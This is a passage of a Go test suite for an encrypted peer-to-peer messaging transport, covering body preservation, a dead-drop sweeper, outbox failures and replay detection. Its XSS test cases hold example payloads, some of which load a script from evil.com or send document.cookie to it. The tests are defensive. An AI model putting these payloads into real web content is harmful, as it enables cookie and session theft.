			ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

			envelope := domain.DinaEnvelope{
				Typ:        "application/dina-encrypted+json",
				FromKID:    "did:key:z6MkSenderTest#key-1",
				ToKID:      "did:key:z6MkRecipientTest#key-1",
				Ciphertext: string(ciphertext),
				Sig:        hex.EncodeToString(sig),
			}

			result, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
			if err != nil {
				t.Fatalf("ReceiveMessage should handle injection payload safely: %v", err)
			}

			// The message should be deserialized correctly — the injection is in the
			// *content* of the Body field, not the message structure. JSON marshal/unmarshal
			// treats Body as []byte, so injection payloads are data, not control.
			if result.ID != "msg-inject-"+tc.name {
				t.Fatalf("expected msg ID 'msg-inject-%s', got %q", tc.name, result.ID)
			}

			// Verify the body was preserved exactly (byte-for-byte).
			if string(result.Body) != string(tc.body) {
				t.Fatalf("body was mutated during transport — possible injection vulnerability")
			}
		})
	}
}

// --------------------------------------------------------------------------
// §29.5 HTML/XSS Body Safety — comprehensive XSS vector testing
// --------------------------------------------------------------------------

// TST-CORE-963
func TestAdv_29_5_HTMLXSSBodySafe(t *testing.T) {
	// Requirement: <script> tag in Body → Body preserved byte-for-byte.
	// The D2D transport layer must treat message bodies as opaque data,
	// never interpreting HTML/JavaScript. All XSS payloads must survive
	// the sign → encrypt → decrypt → verify round-trip unmodified.
	env := newTransportTestEnv(t)
	ctx := context.Background()

	xssVectors := []struct {
		name string
		body string
		desc string
	}{
		{
			"script_tag_basic",
			`<script>alert('xss')</script>`,
			"classic script injection",
		},
		{
			"script_tag_with_src",
			`<script src="https://evil.com/steal.js"></script>`,
			"external script loading",
		},
		{
			"img_onerror",
			`<img src=x onerror="document.location='https://evil.com?c='+document.cookie">`,
			"image error handler XSS",
		},
		{
			"svg_onload",
			`<svg onload="alert(1)"><circle r=50/></svg>`,
			"SVG onload event handler",
		},
		{
			"iframe_injection",
			`<iframe src="javascript:alert('xss')"></iframe>`,
			"iframe with javascript URI",
		},
		{
			"event_handler_body",
			`<body onload="fetch('https://evil.com',{method:'POST',body:document.cookie})">`,
			"body tag event handler",
		},
		{
			"style_expression",
			`<div style="background:url('javascript:alert(1)')">text</div>`,
			"CSS expression injection",
		},
		{
			"nested_html_deep",
			`<div><p><span><script>document.write('<img src=x onerror=alert(1)>')</script></span></p></div>`,
			"deeply nested HTML with embedded script",
		},
		{
			"html_entity_encoded",
			`&#60;script&#62;alert(&#39;xss&#39;)&#60;/script&#62;`,
			"HTML entity-encoded XSS",
		},
		{
			"mixed_content_with_text",
			`Hello! Please visit <a href="javascript:void(0)" onclick="steal()">this link</a> for details.`,
			"social engineering + XSS in regular text",
		},
	}

	for _, tc := range xssVectors {
		t.Run(tc.name, func(t *testing.T) {
			bodyBytes := []byte(tc.body)
			msg := domain.DinaMessage{
				ID:          "msg-xss-" + tc.name,
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkSenderTest",
				To:          []string{"did:key:z6MkRecipientTest"},
				CreatedTime: time.Now().Unix(),
				Body:        bodyBytes,
			}
			plaintext, err := json.Marshal(msg)
			if err != nil {
				t.Fatalf("marshal: %v", err)
			}

			sig, _ := env.signer.Sign(env.senderPriv, plaintext)
			rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
			ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

			envelope := domain.DinaEnvelope{
				Typ:        "application/dina-encrypted+json",
				FromKID:    "did:key:z6MkSenderTest#key-1",
				ToKID:      "did:key:z6MkRecipientTest#key-1",
				Ciphertext: string(ciphertext),
				Sig:        hex.EncodeToString(sig),
			}

			result, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
			if err != nil {
				t.Fatalf("ReceiveMessage must accept XSS body safely (%s): %v", tc.desc, err)
			}

			// Core assertion: body preserved byte-for-byte — no sanitization,
			// no escaping, no mutation. The transport layer is data-opaque.
			if string(result.Body) != tc.body {
				t.Fatalf("body mutated during transport:\n  want: %s\n  got:  %s\n  desc: %s",
					tc.body, string(result.Body), tc.desc)
			}

			// Message metadata must also survive — XSS in body must not
			// corrupt adjacent fields.
			if result.ID != "msg-xss-"+tc.name {
				t.Errorf("ID corrupted: want 'msg-xss-%s', got %q", tc.name, result.ID)
			}
			if result.From != "did:key:z6MkSenderTest" {
				t.Errorf("From corrupted by XSS body: got %q", result.From)
			}
		})
	}

	t.Run("xss_body_does_not_affect_json_structure", func(t *testing.T) {
		// Verify that Go's JSON serialization handles the XSS payload correctly
		// at the serialization boundary — the <script> body must not break
		// the JSON wrapper structure.
		bodyWithScript := []byte(`<script>alert("xss")</script>`)
		msg := domain.DinaMessage{
			ID:   "msg-json-safety",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: bodyWithScript,
		}

		serialized, err := json.Marshal(msg)
		if err != nil {
			t.Fatalf("JSON marshal with XSS body failed: %v", err)
		}

		// The serialized JSON must be valid (parseable).
		var roundTrip domain.DinaMessage
		if err := json.Unmarshal(serialized, &roundTrip); err != nil {
			t.Fatalf("JSON unmarshal failed — XSS body broke JSON structure: %v", err)
		}

		// Body must survive the round-trip.
		if string(roundTrip.Body) != string(bodyWithScript) {
			t.Fatalf("body changed during JSON round-trip:\n  want: %s\n  got:  %s",
				bodyWithScript, roundTrip.Body)
		}
	})
}

// --------------------------------------------------------------------------
// TST-CORE-952: Sweeper processes dead drop blobs
// §29.3 Ingress 3-Valve Defense
// --------------------------------------------------------------------------
// Requirements:
//   - Store 2 encrypted blobs in dead drop → Sweep → 2 delivered
//   - Sweeper must decrypt via transport processor, check TTL, and deliver
//   - Expired blobs (TTL > 24h) must be dropped, not delivered
//   - Poison-pill blobs (undecryptable) are evicted after maxRetries (5)
//   - GC removes blobs older than maxAge (24h) based on file mtime
//   - Without keys or transport, sweeper is fail-closed (0 delivered)

// TST-CORE-952
func TestAdv_29_3_IngressSweeperProcessesBlobs(t *testing.T) {

	// mockTransportProcessor simulates the full transport service for sweeper tests.
	// It tracks calls and can optionally return errors to simulate failures.
	type transportCall struct {
		sealed []byte
	}

	t.Run("two_blobs_both_delivered", func(t *testing.T) {
		// Store 2 blobs with a mock transport that returns valid messages.
		// Sweep must deliver both and ack (delete) them from dead drop.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		// Set up a mock transport processor that decrypts blobs to valid messages.
		var calls []transportCall
		var delivered []*domain.DinaMessage
		sweeper.SetTransport(transportProcessorFunc(func(ctx context.Context, sealed []byte) (*domain.DinaMessage, error) {
			calls = append(calls, transportCall{sealed: sealed})
			return &domain.DinaMessage{
				ID:          fmt.Sprintf("msg-%d", len(calls)),
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkSenderDeadDrop",
				To:          []string{"did:key:z6MkRecipient"},
				CreatedTime: clk.Now().Unix(), // fresh — within TTL
				Body:        sealed,           // echo back for tracing
			}, nil
		}))
		sweeper.SetOnMessage(func(msg *domain.DinaMessage) {
			delivered = append(delivered, msg)
		})

		// Store 2 blobs via the DeadDrop API (simulating ingress while locked).
		ctx := context.Background()
		if err := dd.Store(ctx, []byte("encrypted-msg-1")); err != nil {
			t.Fatalf("Store blob 1: %v", err)
		}
		if err := dd.Store(ctx, []byte("encrypted-msg-2")); err != nil {
			t.Fatalf("Store blob 2: %v", err)
		}

		// Verify blobs are in dead drop before sweep.
		count, _ := dd.Count()
		if count != 2 {
			t.Fatalf("expected 2 blobs in dead drop before sweep, got %d", count)
		}

		// Sweep — should deliver both.
		n, err := sweeper.Sweep(ctx)
		if err != nil {
			t.Fatalf("Sweep: %v", err)
		}
		if n != 2 {
			t.Fatalf("expected 2 delivered, got %d", n)
		}

		// Verify transport processor was called for each blob.
		if len(calls) != 2 {
			t.Fatalf("expected 2 transport processor calls, got %d", len(calls))
		}

		// Verify onMessage callback was invoked for each.
		if len(delivered) != 2 {
			t.Fatalf("expected 2 onMessage callbacks, got %d", len(delivered))
		}

		// Verify blobs were acked (removed) from dead drop.
		countAfter, _ := dd.Count()
		if countAfter != 0 {
			t.Fatalf("expected 0 blobs after sweep (all acked), got %d", countAfter)
		}
	})

	t.Run("expired_blobs_dropped_silently", func(t *testing.T) {
		// Blob with CreatedTime > TTL (24h) ago must be dropped, not delivered.
		// This validates zombie notification filtering (stale news).
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		var delivered []*domain.DinaMessage
		sweeper.SetTransport(transportProcessorFunc(func(ctx context.Context, sealed []byte) (*domain.DinaMessage, error) {
			return &domain.DinaMessage{
				ID:          "msg-old",
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkOldSender",
				To:          []string{"did:key:z6MkRecipient"},
				CreatedTime: clk.Now().Add(-25 * time.Hour).Unix(), // 25h ago — expired
				Body:        sealed,
			}, nil
		}))
		sweeper.SetOnMessage(func(msg *domain.DinaMessage) {
			delivered = append(delivered, msg)
		})

		ctx := context.Background()
		_ = dd.Store(ctx, []byte("old-encrypted-blob"))

		result, err := sweeper.SweepFull(ctx)
		if err != nil {
			t.Fatalf("SweepFull: %v", err)
		}

		// Expired blob: Processed=1, Expired=1, Delivered=0.
		if result.Processed != 1 {
			t.Fatalf("expected 1 processed, got %d", result.Processed)
		}
		if result.Expired != 1 {
			t.Fatalf("expected 1 expired, got %d", result.Expired)
		}
		if result.Delivered != 0 {
			t.Fatalf("expected 0 delivered (expired), got %d", result.Delivered)
		}
		if len(delivered) != 0 {
			t.Fatalf("onMessage must NOT be called for expired blobs, called %d times", len(delivered))
		}

		// Expired blob must still be acked (deleted) from dead drop.
		countAfter, _ := dd.Count()
		if countAfter != 0 {
			t.Fatalf("expired blob must be acked (deleted), got %d remaining", countAfter)
		}
	})

	t.Run("poison_pill_evicted_after_max_retries", func(t *testing.T) {
		// A blob that consistently fails decryption is a poison pill (HIGH-04).
		// After maxRetries (default 5) consecutive failures, it must be evicted.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		// Transport processor always fails — simulates corrupt blob.
		sweeper.SetTransport(transportProcessorFunc(func(ctx context.Context, sealed []byte) (*domain.DinaMessage, error) {
			return nil, errors.New("decryption failed: corrupt data")
		}))

		ctx := context.Background()
		_ = dd.Store(ctx, []byte("poison-pill-blob"))

		// Sweep 4 times — blob should NOT be evicted yet.
		for i := 0; i < 4; i++ {
			_, _ = sweeper.Sweep(ctx)
		}
		count4, _ := dd.Count()
		if count4 != 1 {
			t.Fatalf("after 4 failures blob should still be in dead drop, got count=%d", count4)
		}

		// 5th sweep — blob should be evicted (maxRetries reached).
		_, _ = sweeper.Sweep(ctx)
		count5, _ := dd.Count()
		if count5 != 0 {
			t.Fatalf("after 5 failures blob should be evicted, got count=%d", count5)
		}
	})

	t.Run("gc_stale_blobs_by_mtime", func(t *testing.T) {
		// GCStaleBlobs removes blobs older than maxAge based on file mtime.
		// This provides restart resilience for the in-memory failure tracker.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		os.MkdirAll(ddDir, 0700)

		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		// Use a clock set 25 hours in the future so existing blobs appear stale.
		clk := &transportTestClock{now: time.Now().Add(25 * time.Hour)}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		// Write a blob with current mtime (25h ago from clock's perspective).
		os.WriteFile(filepath.Join(ddDir, "stale.blob"), []byte("stale-data"), 0600)

		evicted := sweeper.GCStaleBlobs()
		if evicted != 1 {
			t.Fatalf("expected 1 stale blob evicted, got %d", evicted)
		}

		// Verify blob was actually deleted.
		countAfter, _ := dd.Count()
		if countAfter != 0 {
			t.Fatalf("stale blob should be deleted after GC, got %d remaining", countAfter)
		}
	})

	t.Run("fresh_blobs_survive_gc", func(t *testing.T) {
		// Anti-tautological contrast: blobs within maxAge must NOT be evicted.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		os.MkdirAll(ddDir, 0700)

		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		// Clock at current time — blobs written now are fresh.
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		os.WriteFile(filepath.Join(ddDir, "fresh.blob"), []byte("fresh-data"), 0600)

		evicted := sweeper.GCStaleBlobs()
		if evicted != 0 {
			t.Fatalf("fresh blob must not be evicted, got %d evicted", evicted)
		}
		countAfter, _ := dd.Count()
		if countAfter != 1 {
			t.Fatalf("fresh blob must survive GC, got %d remaining", countAfter)
		}
	})

	t.Run("sweep_full_mixed_valid_and_expired", func(t *testing.T) {
		// Mix of fresh and expired blobs → SweepFull must categorize correctly.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)

		callIdx := 0
		sweeper.SetTransport(transportProcessorFunc(func(ctx context.Context, sealed []byte) (*domain.DinaMessage, error) {
			callIdx++
			var created int64
			if string(sealed) == "fresh-blob" {
				created = clk.Now().Add(-1 * time.Hour).Unix() // 1h ago — within TTL
			} else {
				created = clk.Now().Add(-48 * time.Hour).Unix() // 48h ago — expired
			}
			return &domain.DinaMessage{
				ID:          fmt.Sprintf("msg-%d", callIdx),
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkMixedSender",
				To:          []string{"did:key:z6MkRecipient"},
				CreatedTime: created,
				Body:        sealed,
			}, nil
		}))

		var delivered int
		sweeper.SetOnMessage(func(msg *domain.DinaMessage) {
			delivered++
		})

		ctx := context.Background()
		_ = dd.Store(ctx, []byte("fresh-blob"))
		_ = dd.Store(ctx, []byte("expired-blob"))

		result, err := sweeper.SweepFull(ctx)
		if err != nil {
			t.Fatalf("SweepFull: %v", err)
		}

		if result.Processed != 2 {
			t.Fatalf("expected 2 processed, got %d", result.Processed)
		}
		if result.Delivered != 1 {
			t.Fatalf("expected 1 delivered (fresh), got %d", result.Delivered)
		}
		if result.Expired != 1 {
			t.Fatalf("expected 1 expired, got %d", result.Expired)
		}
		if delivered != 1 {
			t.Fatalf("onMessage should be called once (fresh blob only), got %d", delivered)
		}
	})

	t.Run("no_transport_no_keys_fail_closed", func(t *testing.T) {
		// Anti-tautological contrast: without transport processor or keys,
		// sweeper must deliver 0 blobs (fail-closed per SEC-LOW-03).
		// This proves the positive tests above are meaningful.
		tmpDir := t.TempDir()
		ddDir := filepath.Join(tmpDir, "dd")
		dd := ingress.NewDeadDrop(ddDir, 100, 100*1024*1024)
		clk := &transportTestClock{now: time.Now()}
		sweeper := ingress.NewSweeper(dd, nil, nil, clk, 24*time.Hour)
		// No SetTransport, no SetKeys — fail-closed.

		ctx := context.Background()
		_ = dd.Store(ctx, []byte("no-way-to-decrypt"))

		n, err := sweeper.Sweep(ctx)
		if err != nil {
			t.Fatalf("Sweep: %v", err)
		}
		if n != 0 {
			t.Fatalf("expected 0 delivered without transport/keys (fail-closed), got %d", n)
		}

		// Blob must remain in dead drop — not silently dropped.
		count, _ := dd.Count()
		if count != 1 {
			t.Fatalf("blob must remain pending (not deleted) when sweeper cannot decrypt, got %d", count)
		}
	})
}

// transportProcessorFunc is an adapter that turns a function into a TransportProcessor.
type transportProcessorFunc func(ctx context.Context, sealed []byte) (*domain.DinaMessage, error)

func (f transportProcessorFunc) ProcessInbound(ctx context.Context, sealed []byte) (*domain.DinaMessage, error) {
	return f(ctx, sealed)
}

// --------------------------------------------------------------------------
// §29.2 Outbox Retry & Queue Limits — Unresolvable DID marked failed
// --------------------------------------------------------------------------

// TST-CORE-942
func TestTransport_29_2_4_UnresolvableDIDMarkedFailed(t *testing.T) {
	// Requirement (§29.2, row 4):
	//   When ProcessOutbox encounters a message to an unknown DID that cannot
	//   be resolved, the message must be marked as "failed" and removed from
	//   pending. No delivery should be attempted.
	//
	// Anti-tautological design:
	//   1. Unknown DID → MarkFailed, not pending, deliverer NOT called
	//   2. Positive control: known DID → delivered, deliverer IS called
	//   3. Mixed queue: known + unknown → only unknown fails, known delivers
	//   4. Invalid DID format → also marked failed
	//   5. DID with empty service endpoint → also marked failed

	t.Run("unknown_DID_marked_failed", func(t *testing.T) {
		env := newTransportTestEnv(t)
		ctx := context.Background()

		// Enqueue a message to a DID the resolver doesn't know.
		// Enqueue returns the auto-generated ID (mock overrides msg.ID).
		msgID, err := env.outbox.Enqueue(ctx, domain.OutboxMessage{
			ToDID:     "did:key:z6MkTotallyUnknown",
			Payload:   []byte("encrypted-payload"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		})
		if err != nil {
			t.Fatalf("Enqueue: %v", err)
		}

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 1 {
			t.Fatalf("expected 1 processed, got %d", processed)
		}

		// Message must be marked failed, not pending.
		pending, _ := env.outbox.ListPending(ctx)
		if len(pending) != 0 {
			t.Fatalf("unresolvable DID message must not remain pending, got %d", len(pending))
		}

		// Verify status is "failed" (not "delivered" or "pending").
		msg, err := env.outbox.GetByID(msgID)
		if err != nil {
			t.Fatalf("GetByID: %v", err)
		}
		if msg.Status != "failed" {
			t.Fatalf("expected status 'failed', got %q", msg.Status)
		}

		// Deliverer must NOT have been called (no delivery attempt for unresolvable DID).
		if len(env.deliverer.calls) != 0 {
			t.Fatalf("deliverer should not be called for unresolvable DID, got %d calls", len(env.deliverer.calls))
		}
	})

	t.Run("positive_control_known_DID_delivers", func(t *testing.T) {
		// Contrast: a message to a KNOWN DID (in resolver) must be delivered.
		// Without this, the test passes if ProcessOutbox marks everything failed.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msgID, err := env.outbox.Enqueue(ctx, domain.OutboxMessage{
			ToDID:     "did:key:z6MkRecipientTest", // Known to resolver
			Payload:   []byte("encrypted-payload"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		})
		if err != nil {
			t.Fatalf("Enqueue: %v", err)
		}

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 1 {
			t.Fatalf("expected 1 processed, got %d", processed)
		}

		// Deliverer MUST have been called for known DID.
		if len(env.deliverer.calls) == 0 {
			t.Fatal("deliverer must be called for known DID — positive control failed")
		}

		// Message should be marked delivered (not failed).
		msg, err := env.outbox.GetByID(msgID)
		if err != nil {
			t.Fatalf("GetByID: %v", err)
		}
		if msg.Status == "failed" {
			t.Fatal("known DID message should not be marked failed")
		}
	})

	t.Run("mixed_queue_selective_failure", func(t *testing.T) {
		// Queue with both known and unknown DIDs: only unknown should fail.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		// Known DID message.
		knownID, err := env.outbox.Enqueue(ctx, domain.OutboxMessage{
			ToDID:     "did:key:z6MkRecipientTest",
			Payload:   []byte("payload-known"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		})
		if err != nil {
			t.Fatalf("Enqueue known: %v", err)
		}

		// Unknown DID message.
		unknownID, err := env.outbox.Enqueue(ctx, domain.OutboxMessage{
			ToDID:     "did:key:z6MkGhostRecipient",
			Payload:   []byte("payload-unknown"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		})
		if err != nil {
			t.Fatalf("Enqueue unknown: %v", err)
		}
		_ = knownID // Used implicitly via deliverer call check

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 2 {
			t.Fatalf("expected 2 processed, got %d", processed)
		}

		// No messages should remain pending.
		pending, _ := env.outbox.ListPending(ctx)
		if len(pending) != 0 {
			t.Fatalf("expected 0 pending after processing, got %d", len(pending))
		}

		// Unknown DID → failed.
		unknownMsg, err := env.outbox.GetByID(unknownID)
		if err != nil {
			t.Fatalf("GetByID unknown: %v", err)
		}
		if unknownMsg.Status != "failed" {
			t.Fatalf("unknown DID must be 'failed', got %q", unknownMsg.Status)
		}

		// Known DID → deliverer called (message processed, delivery attempted).
		if len(env.deliverer.calls) == 0 {
			t.Fatal("deliverer must be called for known DID in mixed queue")
		}
	})

	t.Run("DID_with_empty_service_endpoint_fails", func(t *testing.T) {
		// A DID that resolves but has no service endpoint should also be marked failed.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		// Add a DID to the resolver with empty service list.
		noEndpointDID := "did:key:z6MkNoEndpoint"
		env.resolver.docs[noEndpointDID] = &domain.DIDDocument{
			ID:                 noEndpointDID,
			VerificationMethod: []domain.VerificationMethod{},
			Service:            []domain.ServiceEndpoint{}, // No endpoints!
		}

		msgID, err := env.outbox.Enqueue(ctx, domain.OutboxMessage{
			ToDID:     noEndpointDID,
			Payload:   []byte("payload"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		})
		if err != nil {
			t.Fatalf("Enqueue: %v", err)
		}

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 1 {
			t.Fatalf("expected 1 processed, got %d", processed)
		}

		msg, err := env.outbox.GetByID(msgID)
		if err != nil {
			t.Fatalf("GetByID: %v", err)
		}
		if msg.Status != "failed" {
			t.Fatalf("DID with no service endpoint should be marked 'failed', got %q", msg.Status)
		}

		// Deliverer must NOT be called (no endpoint to deliver to).
		if len(env.deliverer.calls) != 0 {
			t.Fatalf("deliverer should not be called when DID has no endpoint, got %d calls",
				len(env.deliverer.calls))
		}
	})
}

// ==========================================================================
// §A4.1 — SEC-HIGH-08: Replay Detection via ProcessInbound Cache
// ==========================================================================

// TST-CORE-956
func TestTransport_29_4_1_ReplayedMessageSameIDDetected(t *testing.T) {
	// Requirement (§9, SEC-HIGH-08):
	//   ProcessInbound maintains a bounded (sender, msgID) cache.
	//   A message with the same (From, ID) pair as a previously processed
	//   message must be rejected with ErrReplayDetected. This is the
	//   transport-layer defense — separate from application-layer dedup.
	//
	// Anti-tautological design:
	//   1. First processing succeeds, second returns ErrReplayDetected
	//   2. Different message IDs from same sender both accepted
	//   3. Same message ID from different senders both accepted (composite key)
	//   4. PurgeReplayCache clears old entries, allowing reprocessing
	//   5. Positive control: first message always succeeds

	// Helper: build a valid d2dPayload (encrypt + sign) for ProcessInbound.
	buildSealed := func(env *transportTestEnv, msg domain.DinaMessage) []byte {
		plaintext, err := json.Marshal(msg)
		if err != nil {
			t.Fatalf("marshal message: %v", err)
		}

		sig, err := env.signer.Sign(env.senderPriv, plaintext)
		if err != nil {
			t.Fatalf("sign: %v", err)
		}

		rcptX25519Pub, err := env.converter.Ed25519ToX25519Public(env.rcptPub)
		if err != nil {
			t.Fatalf("convert pubkey: %v", err)
		}

		ciphertext, err := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)
		if err != nil {
			t.Fatalf("encrypt: %v", err)
		}

		payload := struct {
			C string `json:"c"`
			S string `json:"s"`
		}{
			C: base64.StdEncoding.EncodeToString(ciphertext),
			S: hex.EncodeToString(sig),
		}
		sealed, err := json.Marshal(payload)
		if err != nil {
			t.Fatalf("marshal payload: %v", err)
		}
		return sealed
	}

	t.Run("duplicate_message_rejected_with_replay_error", func(t *testing.T) {
		env := newTransportTestEnv(t)
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:          "msg-replay-956-001",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"replay test"}`),
		}
		sealed := buildSealed(env, msg)

		// First processing must succeed.
		result, err := env.svc.ProcessInbound(ctx, sealed)
		if err != nil {
			t.Fatalf("first ProcessInbound must succeed: %v", err)
		}
		if result.ID != "msg-replay-956-001" {
			t.Fatalf("message ID mismatch: want msg-replay-956-001, got %q", result.ID)
		}

		// Second processing of identical sealed bytes must fail with ErrReplayDetected.
		_, err = env.svc.ProcessInbound(ctx, sealed)
		if err == nil {
			t.Fatal("second ProcessInbound must fail — replayed message")
		}
		if !errors.Is(err, domain.ErrReplayDetected) {
			t.Fatalf("expected ErrReplayDetected, got: %v", err)
		}
		if !strings.Contains(err.Error(), "duplicate") {
			t.Fatalf("error must mention 'duplicate', got: %v", err)
		}
	})

	t.Run("different_IDs_same_sender_both_accepted", func(t *testing.T) {
		env := newTransportTestEnv(t)
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		ctx := context.Background()

		// Two messages with different IDs from the same sender.
		msg1 := domain.DinaMessage{
			ID:          "msg-unique-A",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"message A"}`),
		}
		msg2 := domain.DinaMessage{
			ID:          "msg-unique-B",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"message B"}`),
		}

		// Both must succeed — different IDs are distinct messages.
		_, err := env.svc.ProcessInbound(ctx, buildSealed(env, msg1))
		if err != nil {
			t.Fatalf("msg1 ProcessInbound must succeed: %v", err)
		}
		_, err = env.svc.ProcessInbound(ctx, buildSealed(env, msg2))
		if err != nil {
			t.Fatalf("msg2 ProcessInbound must succeed: %v", err)
		}
	})

	t.Run("same_ID_different_senders_both_accepted", func(t *testing.T) {
		// The replay key is composite: "senderDID|msgID".
		// Same message ID from different senders must both be accepted.
		env := newTransportTestEnv(t)
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		ctx := context.Background()

		// Message from the standard sender.
		msg1 := domain.DinaMessage{
			ID:          "msg-shared-id",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"from sender"}`),
		}
		_, err := env.svc.ProcessInbound(ctx, buildSealed(env, msg1))
		if err != nil {
			t.Fatalf("msg from sender must succeed: %v", err)
		}

		// Now create a second sender with different keys.
		signer2 := dinacrypto.NewEd25519Signer()
		seed2 := [32]byte{0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
			0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x00,
			0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
			0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10}
		sender2Pub, sender2Priv, err := signer2.GenerateFromSeed(seed2[:])
		if err != nil {
			t.Fatalf("generate sender2 keys: %v", err)
		}

		// Register sender2 in the DID resolver.
		sender2DID := "did:key:z6MkSender2Test"
		env.resolver.docs[sender2DID] = &domain.DIDDocument{
			ID: sender2DID,
			VerificationMethod: []domain.VerificationMethod{{
				ID:                 sender2DID + "#key-1",
				Type:               "Ed25519VerificationKey2020",
				Controller:         sender2DID,
				PublicKeyMultibase: "z" + base58.Encode(append([]byte{0xed, 0x01}, sender2Pub...)),
			}},
		}

		// Message from sender2 with same ID.
		msg2 := domain.DinaMessage{
			ID:          "msg-shared-id", // same ID as msg1
			Type:        domain.MsgTypeSocialUpdate,
			From:        sender2DID,
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"from sender2"}`),
		}
		plaintext2, _ := json.Marshal(msg2)
		sig2, _ := signer2.Sign(sender2Priv, plaintext2)
		rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
		ct2, _ := env.encryptor.SealAnonymous(plaintext2, rcptX25519Pub)
		sealed2, _ := json.Marshal(struct {
			C string `json:"c"`
			S string `json:"s"`
		}{
			C: base64.StdEncoding.EncodeToString(ct2),
			S: hex.EncodeToString(sig2),
		})

		// Must succeed — different sender means different replay key.
		result2, err := env.svc.ProcessInbound(ctx, sealed2)
		if err != nil {
			t.Fatalf("msg from sender2 with same ID must succeed (different sender): %v", err)
		}
		if result2.From != sender2DID {
			t.Fatalf("expected From=%s, got %s", sender2DID, result2.From)
		}
	})

	t.Run("purge_cache_allows_reprocessing", func(t *testing.T) {
		env := newTransportTestEnv(t)
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:          "msg-purge-test",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"will be purged"}`),
		}
		sealed := buildSealed(env, msg)

